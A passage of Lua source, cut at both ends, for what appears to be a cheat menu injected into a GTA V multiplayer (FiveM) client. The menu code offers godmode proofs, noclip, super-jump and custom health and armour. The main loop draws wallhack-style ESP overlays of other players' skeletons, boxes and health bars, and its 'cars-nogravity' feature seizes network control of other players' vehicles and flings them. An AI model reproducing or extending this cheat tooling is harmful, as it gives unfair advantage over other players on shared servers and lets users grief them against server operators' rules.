                   sum.f.SetEntityHealth(sum.f.PlayerPedId(-1), 200)
                   sum.f.ClearPedBloodDamage(sum.f.PlayerPedId())
                   local coords = sum.f.GetEntityCoords(sum.f.PlayerPedId())
                   TriggerEvent("playerSpawned", coords.x, coords.y, coords.z)
                   sum.f.SetEntityCoordsNoOffset(sum.f.PlayerPedId(), coords.x, coords.y, coords.z, false, false, false, true)
                   sum.f.NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, 0, true, false)
                   sum.f.ClearPedBloodDamage(sum.f.PlayerPedId()) 
               end
           end
           y = y + add 
           if y >= 0.385 and y <= max then 
               if sum.f.button('Custom Health', 0.3875, y) then 
                   sum.f.SetEntityMaxHealth(sum.f.PlayerPedId(), sum.s['player-health-custom'].value)
                   sum.f.SetPlayerHealthRechargeMultiplier(sum.f.PlayerId(), 1337.0)
                   sum.f.SetMaxHealthHudDisplay(200)
               end
           end  y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['player-health-custom'], 0.3875, y) 
           end y = y + add 
           if y >= 0.385 and y <= max then 
               if sum.f.button('Heal', 0.3875, y) then 
                   sum.f.SetEntityHealth(sum.f.PlayerPedId(), 100 + sum.s['player-health'].value)
               end
           end  y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['player-health'], 0.3875, y) 
           end y = y + add 
           if y >= 0.385 and y <= max then 
               if sum.f.button('Armor', 0.3875, y) then 
                   sum.f.SetPedArmour(sum.f.PlayerPedId(), sum.s['player-armor'].value)
               end
           end  y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['player-armor'], 0.3875, y) 
           end y = y + add 
           if y >= 0.385 and y <= max then 
               if sum.f.button('Clear', 0.3875, y) then 
                   sum.f.ClearPedBloodDamage(sum.f.PlayerPedId())
                   sum.f.ClearPedWetness(sum.f.PlayerPedId())
                   sum.f.ClearPedEnvDirt(sum.f.PlayerPedId())
                   sum.f.ResetPedVisibleDamage(sum.f.PlayerPedId())
               end
           end
           y = y + add  
           if y >= 0.385 and y <= max then 
               if sum.f.button('Suicide', 0.3875, y) then 
                   sum.f.SetEntityHealth(sum.f.PlayerPedId(), 0)
               end
           end
           y = y + add  
           if y >= 0.385 and y <= max then 
               if sum.f.button('Sky Dive', 0.3875, y) then 
                   local coords = sum.f.GetEntityCoords(sum.f.PlayerPedId())
                   sum.f.SetEntityCoords(sum.f.PlayerPedId(), coords.x, coords.y, coords.z+200.0)
                   sum.f.GiveWeaponToPed(sum.f.PlayerPedId(), 0xFBAB5776, 1, 0)
               end
           end  y = y + add 
           
   
           local y = 0.387+sum.st['player'].static2
           if sum.f.IsDisabledControlPressed(0, 14) and y > (0.387 - (29 * add)) and sum.f.mouse((dW/2)+0.561+drag_X+dW/4, 0.51+drag_Y+dH/2, dW+0.121-dW/2, 0.2658+dH) then
               sum.st['player'].static2 = sum.st['player'].static2 - add
           end
           if sum.f.IsDisabledControlJustPressed(0, 15) and y ~= 0.387 and sum.f.mouse((dW/2)+0.561+drag_X+dW/4, 0.51+drag_Y+dH/2, dW+0.121-dW/2, 0.2658+dH) then
               sum.st['player'].static2 = sum.st['player'].static2 + add
           end
   
           if y >= 0.385 and y <= max then 
               sum.f.separator('Godmode Options', 0.51, y) 
           end
           y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('player-bulletproof', 'Bullet Proof', 0.51, y) 
           end 
           y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('player-fireproof', 'Fire Proof', 0.51, y) 
           end 
           y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('player-explosionproof', 'Explosion Proof', 0.51, y) 
           end 
           y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('player-collisionproof', 'Collision Proof', 0.51, y) 
           end 
           y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('player-meleeproof', 'Melee Proof', 0.51, y) 
           end 
           y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('player-steamproof', 'Steam Proof', 0.51, y) 
           end 
           y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('player-drownproof', 'Drown Proof', 0.51, y) 
           end 
           y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.separator('Magneto Mode', 0.51, y) 
           end
           y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('magneto-mode', 'Magneto Mode', 0.51, y) 
               if sum.f.pickerbutton(sum.s['magneto-r'].value, sum.s['magneto-g'].value, sum.s['magneto-b'].value, 0.51, y) then 
                   sum.s['magneto-r'].value, sum.s['magneto-g'].value, sum.s['magneto-b'].value = sum.f.ColorPicker(sum.s['magneto-r'].value, sum.s['magneto-g'].value, sum.s['magneto-b'].value)
               end
           end 
           y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.button('Magneto Mode Power', 0.51, y)   
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['magneto-power'], 0.51, y, 3) 
           end y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.button('Magneto Mode Marker', 0.51, y)   
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['magneto-marker'], 0.51, y) 
           end y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.separator('Wardrobe', 0.51, y) 
           end
           y = y + add  
           
           if y >= 0.385 and y <= max then 
               if sum.f.button('Hat', 0.51, y) then  
                   sum.f.SetPedPropIndex(sum.f.PlayerPedId(), 0, sum.s['hat'].value, 1, 0)
               end
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['hat'], 0.51, y) 
           end y = y + add 
           if y >= 0.385 and y <= max then 
               if sum.f.button('Glasses', 0.51, y) then  
                   sum.f.SetPedPropIndex(sum.f.PlayerPedId(), 1, sum.s['glasses'].value, 1, 0)
               end
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['glasses'], 0.51, y) 
           end y = y + add 
           if y >= 0.385 and y <= max then 
               if sum.f.button('Mask', 0.51, y) then 
                   sum.f.SetPedComponentVariation(sum.f.PlayerPedId(), 1, sum.s['mask'].value, 0, 0)
               end
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['mask'], 0.51, y) 
           end y = y + add 
           if y >= 0.385 and y <= max then 
               if sum.f.button('Hair', 0.51, y) then 
                   sum.f.SetPedComponentVariation(sum.f.PlayerPedId(), 2, sum.s['hair'].value, 0, 0)
               end
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['hair'], 0.51, y) 
           end y = y + add 
           if y >= 0.385 and y <= max then 
               if sum.f.button('Torso', 0.51, y) then 
                   sum.f.SetPedComponentVariation(sum.f.PlayerPedId(), 3, sum.s['torso'].value, 0, 0)
               end
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['torso'], 0.51, y) 
           end y = y + add 
           if y >= 0.385 and y <= max then 
               if sum.f.button('Legs', 0.51, y) then 
                   sum.f.SetPedComponentVariation(sum.f.PlayerPedId(), 4, sum.s['legs'].value, 0, 0)
               end
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['legs'], 0.51, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               if sum.f.button('Accesory', 0.51, y) then 
                   sum.f.SetPedComponentVariation(sum.f.PlayerPedId(), 5, sum.s['accesory'].value, 0, 0)
               end
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['accesory'], 0.51, y) 
           end y = y + add 
           if y >= 0.385 and y <= max then 
               if sum.f.button('Shoes', 0.51, y) then 
                   sum.f.SetPedComponentVariation(sum.f.PlayerPedId(), 6, sum.s['shoes'].value, 0, 0)
               end
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['shoes'], 0.51, y) 
           end y = y + add 
           if y >= 0.385 and y <= max then 
               if sum.f.button('Undershirt', 0.51, y) then 
                   sum.f.SetPedComponentVariation(sum.f.PlayerPedId(), 8, sum.s['undershirt'].value, 0, 0)
               end
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['undershirt'], 0.51, y) 
           end y = y + add 
           if y >= 0.385 and y <= max then 
               if sum.f.button('Shirt', 0.51, y) then 
                   sum.f.SetPedComponentVariation(sum.f.PlayerPedId(), 11, sum.s['shirt'].value, 0, 0)
               end
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['shirt'], 0.51, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.separator('Auto System', 0.51, y) 
           end
           y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('player-smart-health', 'Auto Health', 0.51, y) 
           end 
           y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.button('Auto Health: Health', 0.51, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['player-smart-health'], 0.51, y) 
           end y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.button('Auto Health: Delay', 0.51, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['player-smart-health-time'], 0.51, y) 
           end y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('player-smart-armor', 'Auto Armor', 0.51, y) 
           end 
           y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.button('Auto Health: Armor', 0.51, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['player-smart-armor'], 0.51, y) 
           end y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.button('Auto Armor: Delay', 0.51, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['player-smart-armor-time'], 0.51, y) 
           end y = y + add 
       end
       local x, y = sum.f.getmousepos()
       sum.f.drawTextOutline('o', x, y, 0.2, 0, true, true, sum.s['menu-r'].value, sum.s['menu-g'].value, sum.s['menu-b'].value)
   end
   
   --if sum.f.GetServerInformation ~= 0 then --[[print("\91\102\105\118\101\94\50\115\101\110\115\101\94\48\93\32\86\101\114\105\102\105\101\100\33\32\85\73\68\58 "..sum.f.GetServerInformation())]] else sum.menu = false sum['OpenMenu'] = false end -- BLACKCOCK
   --sum.c['visuals-radar']=true;
   sum.c['vehicle-enterveh']=true;
   sum.c['visuals-boundibg-box-outline']=true;
   sum.c['visuals-healthbar-outline']=true;
   sum['OpenMenu'] = -1
   
   sum.curak.thr(function()
       while sum.menu do 
           sum.curak.wait(0)
           if sum.f.IsDisabledControlJustPressed(0, sum['OpenMenu']) then 
               sum.f.drawmenu = not sum.f.drawmenu
           end
   
           if sum.f.drawmenu then 
               sum.f:movement()
               sum.f:draw()
               sum.f:drawgradient()
           end
           if sum.c['visuals-radar'] then
               sum.f.DisplayRadar(sum.c['visuals-radar'], 1)
           end
           sum.f.SetEntityCanBeDamaged(sum.f.PlayerPedId(), not sum.c['player-nodamage'])
           sum.f.SetPedSuffersCriticalHits(sum.f.PlayerPedId(), not sum.c['player-anticritialhits'])
           sum.f.SetEntityProofs(sum.f.PlayerPedId(), sum.c['player-bulletproof'], sum.c['player-fireproof'], sum.c['player-explosionproof'], sum.c['player-collisionproof'], sum.c['player-meleeproof'], sum.c['player-steamproof'], false, sum.c['player-drownproof'])
           sum.f.SetPedDiesInWater(sum.f.PlayerPedId(), not sum.c['player-stopdrowing'])
   
   
           
           if sum.c['visuals-third-person'] then
               sum.f.SetFollowPedCamViewMode(0)
               sum.f.SetFollowVehicleCamViewMode(0)
           end
   
           if sum.c['player-superMan'] then
               sum.f.SetPedCanRagdoll(sum.f.PlayerPedId(), false)
               sum.f.GiveDelayedWeaponToPed(sum.f.PlayerPedId(), 0xFBAB5776, 1, 0)
               if sum.f.IsControlPressed(0, 22) or sum.f.IsControlPressed(0, 32) then
                   if sum.f.IsControlPressed(0, 22) then
                       sum.f.ApplyForceToEntity(sum.f.PlayerPedId(), 1, 0.0, 0.0, 500.0, 0.0, 0.0, 0.0, true, true, true, true, false, true)
                   elseif sum.f.IsEntityInAir(sum.f.PlayerPedId()) then
                       sum.f.ApplyForceToEntity(sum.f.PlayerPedId(), 1, 0.0, 500.0, 0.0, 0.0, 0.0, 0.0, true, true, true, true, false, true)
                   end
               end
           --else
               --sum.f.SetPedCanRagdoll(sum.f.PlayerPedId(), true)
           end
   
           if sum.c['player-walkOnWater'] then
               sum.curak.thr(function()
                   local storedheading
                   local p = sum.f.PlayerPedId()
                   local x, y, z
                   local waterbool, waterh
                   waterbool, waterh = GetWaterHeight(x, y, z, z)
                   if sum.f.IsPedInAnyVehicle(p, false) then
                       storedheading = sum.f.GetEntityHeading(sum.f.GetVehiclePedIsIn(p, false))
                       x, y, z = table.unpack(sum.f.GetEntityCoords(sum.f.GetVehiclePedIsIn(p, false)))
                   else
                       storedheading = sum.f.GetEntityHeading(p)
                       x, y, z = table.unpack(sum.f.GetEntityCoords(p))
                   end
                   if not sum.f.DoesEntityExist(object) or object == nil then
                       object = sum.f.CreateObject(sum.f.GetHashKey("prop_lev_des_barge_01"), x, y, waterh - 4.0, true, false, false)
                       sum.f.SetEntityAlpha(object, 0, true)
                       sum.f.SetEntityDynamic(object, false)
                   end
                   sum.f.SetEntityCoords(object, x, y, waterh - 2.0)
                   sum.f.SetEntityRotation(object, 0.0, 180.0, -storedheading, 1, true)
               end)
           else
               sum.f.DeleteEntity(object)
           end
   
           if sum.c['player-noclip'] then
               local old = 1.0
               local vehicleecheck = sum.f.IsPedInAnyVehicle(sum.f.PlayerPedId(), 0)
               local player = nil
               local x, y, z = nil
               if not vehicleecheck then
                   player = sum.f.PlayerPedId()
                   x, y, z = table.unpack(sum.f.GetEntityCoords(sum.f.PlayerPedId(), 2))
               else
                   player = sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), 0)
                   x, y, z = table.unpack(sum.f.GetEntityCoords(sum.f.PlayerPedId(), 1))
               end
               if vehicleecheck and sum.f.getSeatPedIsIn(sum.f.PlayerPedId()) ~= -1 then
                   sum.f.requestControlOnce(player)
               end
               local Camerax, Cameray, Cameraz = sum.f.camDirect()
               sum.f.SetEntityVelocity(player, 0.0001, 0.0001, 0.0001)
   
               if sum.f.IsDisabledControlJustPressed(0, 21) then 
                   old = sum.s['player-noclip-value'].value
                   sum.s['player-noclip-value'].value = sum.s['player-noclip-value'].value * 5
               end
               if sum.f.IsDisabledControlJustReleased(0, 21) then 
                   sum.s['player-noclip-value'].value = old
               end
               if sum.f.IsDisabledControlPressed(0, 32) then
                   x = x + sum.s['player-noclip-value'].value * Camerax
                   y = y + sum.s['player-noclip-value'].value * Cameray
                   z = z + sum.s['player-noclip-value'].value * Cameraz
               end
               if sum.f.IsDisabledControlPressed(0, 269) then
                   x = x - sum.s['player-noclip-value'].value * Camerax
                   y = y - sum.s['player-noclip-value'].value * Cameray
                   z = z - sum.s['player-noclip-value'].value * Cameraz
               end
               if sum.f.IsDisabledControlPressed(0, 22) then
                   z = z + sum.s['player-noclip-value'].value
               end
               if sum.f.IsDisabledControlPressed(0, 36) then
                   z = z - sum.s['player-noclip-value'].value
               end
               sum.f.SetEntityCoordsNoOffset(player, x, y, z, true, true, true)
           end
   
   
   
           if sum.c['visuals-armorbar'] then 
               for ped in sum.f.enumeratePeds() do 
                   local x, y, z = table.unpack(sum.f.GetEntityCoords(ped))
                  
                   if sum.c['visuals-armorbar-self'] then 
                       self = ped 
                   else
                       self = ped ~= sum.f.PlayerPedId()
                   end
   
                   if sum.c['visuals-armorbar-peds'] then 
                       peds = ped 
                   else
                       peds = sum.f.IsPedAPlayer(ped)
                   end
                   if self and peds and sum.f.IsEntityOnScreen(ped) then 
                       sum.f.SetDrawOrigin(x, y, z, 0)
                       sum.f.armorbar(ped)
                       sum.f.ClearDrawOrigin()
                   end
                  
               end
           end
   
           if sum.c['visuals-cornerbox'] then 
               for ped in sum.f.enumeratePeds() do 
                   local x, y, z = table.unpack(sum.f.GetEntityCoords(ped))
                   if sum.c['visuals-cornerbox-self'] then 
                       self = ped 
                   else
                       self = ped ~= sum.f.PlayerPedId()
                   end
   
                   if sum.c['visuals-cornerbox-peds'] then 
                       peds = ped 
                   else
                       peds = sum.f.IsPedAPlayer(ped)
                   end
                   if self and peds and sum.f.IsEntityOnScreen(ped) then 
                       sum.f.SetDrawOrigin(x, y, z, 0)
                       sum.f.cornerbox(ped)
                       sum.f.ClearDrawOrigin()
                   end
                   
               end
           end
   
       if sum.c['cars-nogravity'] then 
           for ped in sum.f.enumeratePeds() do
               local vehicle = sum.f.GetVehiclePedIsUsing(ped)
                   if sum.f.DoesEntityExist(vehicle) then
                       sum.f.requestControlOnce(vehicle)
                       sum.f.NetworkRequestControlOfEntity(ped)
                       sum.f.SetDriveTaskDrivingStyle(ped, 1076)
                       sum.f.SetVehicleGravityAmount(sum.f.GetVehiclePedIsIn(ped, 0), 100)
                       sum.f.ApplyForceToEntity(vehicle, 3, 0.0, 0.0, 0.000005, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                   end
               end
           end
   
           if sum.c['visuals-enabledynamic'] then 
               for ped in sum.f.enumeratePeds() do 
                   if sum.c['visuals-dynamicpeds'] then 
                       mr = ped 
                   else
                       mr = sum.f.IsPedAPlayer(ped)
                   end
                   if sum.c['visuals-dynamicself'] then 
                       ma = ped 
                   else
                       ma = ped ~= sum.f.PlayerPedId()
                   end
                   local coordXMin = sum.f.GetOffsetFromEntityInWorldCoords(ped, 0.4, 0.0, 0.9)
                   local coordYPlus = sum.f.GetOffsetFromEntityInWorldCoords(ped, -0.4, 0.0, -0.9)
       
                   local bool, screenX, screenY = sum.f.GetScreenCoordFromWorldCoord(coordXMin.x, coordXMin.y, coordXMin.z)
                   local bool2, screenX2, screenY2 = sum.f.GetScreenCoordFromWorldCoord(coordYPlus.x, coordYPlus.y, coordYPlus.z)
                   local resX, resY = sum.f.GetActiveScreenResolution()
                   local coord = sum.f.GetEntityCoords(ped)
                   local x, y, z = coord.x, coord.y, coord.z
                   local d = sum.f.GetDistanceBetweenCoords(sum.f.GetFinalRenderedCamCoord(), sum.f.GetEntityCoords(ped), false)
                   if d < sum.s['visuals-distance'].value then
                       sum.f.SetDrawOrigin(x, y, z, 0)
                       local d = sum.f.GetDistanceBetweenCoords(sum.f.GetFinalRenderedCamCoord(), sum.f.GetEntityCoords(ped), false)-(sum.f.GetGameplayCamFov()-50.0)
                       if mr and ma and bool and bool2 and not sum.f.IsEntityDead(ped) and sum.f.IsEntityOnScreen(ped)  then
                           local math = (screenX - screenX2)
                           local math2 = (screenY2 - screenY)
                           
                           if sum.c['visuals-dynamicbox'] then 
                               sum.f.DrawRect(0.0, -math2/2, math, 3/resY, 1, 1, 1, 255)
                               sum.f.DrawRect(0.0, math2/2, math, 3/resY, 1, 1, 1, 255)
                               sum.f.DrawRect(math/2, 0.0, 3/resX, screenY2 - screenY, 1, 1, 1, 255)
                               sum.f.DrawRect(-math/2, 0.0, 3/resX, screenY2 - screenY, 1, 1, 1, 255)
                               sum.f.DrawRect(0.0, -math2/2, math, 1/resY, 255, 255, 255, 255)
                               sum.f.DrawRect(0.0, math2/2, math, 1/resY, 255, 255, 255, 255)
                               sum.f.DrawRect(math/2, 0.0, 1/resX, screenY2 - screenY, 255, 255, 255, 255)
                               sum.f.DrawRect(-math/2, 0.0, 1/resX, screenY2 - screenY, 255, 255, 255, 255)
                               if sum.c['visuals-dynamicbox-fill'] then 
                                   sum.f.DrawRect(0.0, 0.0, math, screenY2 - screenY, 0, 0, 0, 100)
                               end
                           end
   
                           local NUM = (sum.f.GetEntityMaxHealth(ped)-100) / math2
                           local H = sum.f.GetEntityHealth(ped)-100
                           if H > (sum.f.GetEntityMaxHealth(ped)-100) then 
                               H = (sum.f.GetEntityMaxHealth(ped)-100) 
                           end
                           
                           if math < 0.0 then 
                               if sum.c['visuals-dynamichealth'] then 
                                   sum.f.DrawRect((-math/2 + 3.5 / resX), 0.0, 3 / resX, math2+0.0018, 1, 1, 1, 255)
                                   sum.f.DrawRect((-math/2 + 3.5 / resX), 0 + math2/2 - ((H/NUM) - (1 / resX))/2, 1 / resX, -1*(H/NUM)-(1 / resX), 1, 255, 1, 255)
                               end
                               if sum.c['visuals-dynamicarmor'] then 
                                   local NUM = 100 / math2
                                   local A = sum.f.GetPedArmour(ped)
                                   if A ~= 0 then 
                                       sum.f.DrawRect((-math/2 + 7.5 / resX), 0 + math2/2 - ((A/NUM) )/2, 3 / resX, -1*(A/NUM)-(1 / resX), 1, 1, 1, 255)
                                       sum.f.DrawRect((-math/2 + 7.5 / resX), 0 + math2/2 - ((A/NUM) )/2, 1 / resX, -1*(A/NUM)-(1 / resX), 1, 123, 255, 255)
                                   end
                               end
                           else 
                               if sum.c['visuals-dynamichealth'] then 
                                   sum.f.DrawRect((-math/2 - 3.5 / resX), 0.0, 3 / resX, math2+0.0018, 1, 1, 1, 255)
                                   sum.f.DrawRect((-math/2 - 3.5 / resX), 0 + math2/2 - ((H/NUM) - (1 / resX))/2, 1 / resX, -1*(H/NUM)-(1 / resX), 1, 255, 1, 255)
                               end
                               if sum.c['visuals-dynamicarmor'] then 
                                   local NUM = 100 / math2
                                   local A = sum.f.GetPedArmour(ped)
                                   if A ~= 0 then 
                                       sum.f.DrawRect((-math/2 - 7.5 / resX), 0 + math2/2 - ((A/NUM) )/2, 3 / resX, -1*(A/NUM)-(1 / resX), 1, 1, 1, 255)
                                       sum.f.DrawRect((-math/2 - 7.5 / resX), 0 + math2/2 - ((A/NUM) )/2, 1 / resX, -1*(A/NUM)-(1 / resX), 1, 123, 255, 255)
                                   end
                               end
                           end                   
                       end 
                       sum.f.ClearDrawOrigin()
                   end
               end
           end
   
           if sum.c['player-infinitecombatroll'] then
               for i = 0, 3 do
                   sum.f.StatSetInt(sum.f.GetHashKey("mp" .. i .. "_shooting_ability"), 9999, true)
                   sum.f.StatSetInt(sum.f.GetHashKey("sp" .. i .. "_shooting_ability"), 9999, true)
               end
           --else
               --for i = 0, 3 do
                 -- StatSetInt(sum.f.GetHashKey("mp" .. i .. "_shooting_ability"), 0, true)
                 --  StatSetInt(sum.f.GetHashKey("sp" .. i .. "_shooting_ability"), 0, true)
              -- end
           end
   
           if sum.c['visuals-boundingbox'] then 
               for ped in sum.f.enumeratePeds() do 
                   local x, y, z = table.unpack(sum.f.GetEntityCoords(ped))
                   
                   if sum.c['visuals-boundingbox-self'] then 
                       self = ped 
                   else
                       self = ped ~= sum.f.PlayerPedId()
                   end
   
                   if sum.c['visuals-boundingbox-peds'] then 
                       peds = ped 
                   else
                       peds = sum.f.IsPedAPlayer(ped)
                   end
                   if self and peds and sum.f.IsEntityOnScreen(ped) then 
                       sum.f.SetDrawOrigin(x, y, z, 0)
                       sum.f.boundingbox(ped)
                       sum.f.ClearDrawOrigin()
                   end
               end
           end
   
           if sum.c['visuals-healthbar'] then 
               for ped in sum.f.enumeratePeds() do 
                   local x, y, z = table.unpack(sum.f.GetEntityCoords(ped))
   
                   if sum.c['visuals-healthbar-self'] then 
                       self = ped 
                   else
                       self = ped ~= sum.f.PlayerPedId()
                   end
   
                   if sum.c['visuals-healthbar-peds'] then 
                       peds = ped 
                   else
                       peds = sum.f.IsPedAPlayer(ped)
                   end
                   if self and peds and sum.f.IsEntityOnScreen(ped) then 
                       sum.f.SetDrawOrigin(x, y, z, 0)
                       sum.f.healthbar(ped)
                       sum.f.ClearDrawOrigin()
                   end
                  
               end
           end
   
           if sum.c['visuals-skeletons'] then 
               for ped in sum.f.enumeratePeds() do
                   local d = sum.f.GetDistanceBetweenCoords(sum.f.GetFinalRenderedCamCoord(), sum.f.GetEntityCoords(ped), false) 
                   if sum.c['visuals-skeletons-peds'] then 
                       mr = ped
                   else
                       mr = sum.f.IsPedAPlayer(ped)
                   end
                   if sum.c['visuals-skeletons-self'] then 
                       me = ped
                   else
                       me = ped ~= sum.f.PlayerPedId() 
                   end
                   dead = sum.f.IsEntityDead(ped)
                   
                   if d < sum.s['visuals-distance'].value then
                       if mr and me and not dead and sum.f.IsEntityOnScreen(ped) then
                           if sum.c['visuals-skeletons-vischeck'] then
                               if sum.f.HasEntityClearLosToEntity(sum.f.PlayerPedId(), ped, 19) then 
                               local r, g, b =  sum.s['visuals-skeletons-vis-r'].value, sum.s['visuals-skeletons-vis-g'].value, sum.s['visuals-skeletons-vis-b'].value			
                               sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 31086, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0x9995, 0.0, 0.0, 0.0),r, g, b, 255)
                               sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0x9995, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0xE0FD, 0.0, 0.0, 0.0),r, g, b, 255)
                               sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0x5C57, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0xE0FD, 0.0, 0.0, 0.0),r, g, b, 255)
                               sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0x192A, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0xE0FD, 0.0, 0.0, 0.0),r, g, b, 255)
                               sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0x3FCF, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0x192A, 0.0, 0.0, 0.0),r, g, b, 255)
                               sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0xCC4D, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0x3FCF, 0.0, 0.0, 0.0),r, g, b, 255)
                               sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0xB3FE, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0x5C57, 0.0, 0.0, 0.0),r, g, b, 255)
                               sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0xB3FE, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0x3779, 0.0, 0.0, 0.0),r, g, b, 255)
                               sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0x9995, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0xB1C5, 0.0, 0.0, 0.0),r, g, b, 255)
                               sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0xB1C5, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0xEEEB, 0.0, 0.0, 0.0),r, g, b, 255)
                               sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0xEEEB, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0x49D9, 0.0, 0.0, 0.0),r, g, b, 255)
                               sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0x9995, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0x9D4D, 0.0, 0.0, 0.0),r, g, b, 255)
                               sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0x9D4D, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0x6E5C, 0.0, 0.0, 0.0),r, g, b, 255)
                               sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0x6E5C, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0xDEAD, 0.0, 0.0, 0.0),r, g, b, 255)
                           else
                               local r, g, b = sum.s['visuals-skeletons-r'].value, sum.s['visuals-skeletons-g'].value, sum.s['visuals-skeletons-b'].value					
                               sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 31086, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0x9995, 0.0, 0.0, 0.0),r, g, b, 255)
                               sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0x9995, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0xE0FD, 0.0, 0.0, 0.0),r, g, b, 255)
                               sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0x5C57, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0xE0FD, 0.0, 0.0, 0.0),r, g, b, 255)
                               sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0x192A, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0xE0FD, 0.0, 0.0, 0.0),r, g, b, 255)
                               sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0x3FCF, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0x192A, 0.0, 0.0, 0.0),r, g, b, 255)
                               sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0xCC4D, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0x3FCF, 0.0, 0.0, 0.0),r, g, b, 255)
                               sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0xB3FE, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0x5C57, 0.0, 0.0, 0.0),r, g, b, 255)
                               sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0xB3FE, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0x3779, 0.0, 0.0, 0.0),r, g, b, 255)
                               sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0x9995, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0xB1C5, 0.0, 0.0, 0.0),r, g, b, 255)
